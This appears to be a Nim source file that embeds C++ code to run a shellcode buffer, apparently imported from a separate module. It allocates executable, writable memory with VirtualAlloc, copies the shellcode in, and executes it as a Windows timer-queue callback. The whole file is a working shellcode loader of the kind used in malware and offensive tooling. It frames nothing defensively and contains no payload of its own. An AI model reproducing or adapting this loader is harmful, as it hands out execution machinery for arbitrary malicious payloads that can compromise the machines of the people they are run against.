import public

{.emit: """
#include <stdio.h>

int CreateTimerQueueTimerNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    HANDLE timer;
    HANDLE queue = ::CreateTimerQueue();
    HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!::CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0)) {
      printf("Fail");
    }
    if (::WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
      printf("WaitForSingleObject failed (%d)\n", GetLastError());
}
"""
.}

proc CreateTimerQueueTimerNim(plainBuffer:cstring,size:cint):cint {.importcpp:"CreateTimerQueueTimerNim(@)",nodecl.}

discard CreateTimerQueueTimerNim(code,codelen)